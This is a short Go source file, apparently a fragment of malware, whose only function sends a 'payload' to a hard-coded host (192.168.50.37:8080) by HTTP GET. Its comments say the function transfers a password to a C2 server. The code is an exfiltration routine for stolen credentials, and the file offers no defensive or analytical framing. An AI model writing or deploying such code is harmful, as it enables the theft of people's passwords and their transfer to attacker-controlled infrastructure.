package main

import (
	"fmt"
	"net/http"
)

func transferPayload(payload string) error {
	// Transfer password to C2 - Using super basic transfer mechanism for now
	// TODO configurable destination
	_, err := http.Get("http://192.168.50.37:8080/" + payload)
	if err != nil {
		return fmt.Errorf("payload transfer failed: %v", err)
	}

	return nil
}
